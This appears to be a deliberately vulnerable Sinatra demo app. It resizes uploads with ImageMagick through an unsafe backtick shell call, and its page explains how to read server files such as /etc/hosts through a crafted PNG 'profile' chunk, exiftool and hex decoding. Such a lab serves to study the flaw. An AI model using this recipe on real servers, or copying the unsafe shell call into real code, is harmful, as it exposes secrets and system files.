require 'sinatra'
require 'securerandom'

get '/' do
  erb :upload
end

post '/upload' do
  uploaded_file_path = params[:file][:tempfile].path
  output_file_path = "exploit-#{SecureRandom.uuid}.png"
  `convert #{uploaded_file_path} -resize 100x100 #{output_file_path}`
  send_file output_file_path, disposition: :attachment
end

__END__

@@upload
<p>Upload a malicious PNG crafted via `pngcrush -text a "profile" "/etc/hosts" any-png-you-have.png` (any file readable by the app user is able to be exfiltrated, try "/app/super-secret" to exfiltrate a file in application code)</p>
<p>Download the resultant file</p>
<p>Run it through `exiftool` and copy the output Raw Profile Type data: `exiftool the-downloaded-file.png` (you may need `exiftool -b` if the output is large)</p>
<p>Paste that into https://gchq.github.io/CyberChef, set to From Hex with Delimiter: auto.</p>
<p>
<form action="/upload" enctype="multipart/form-data" method="POST">
    <input name="file" type="file" required />
    <input type="submit" value="Upload" />
</form>
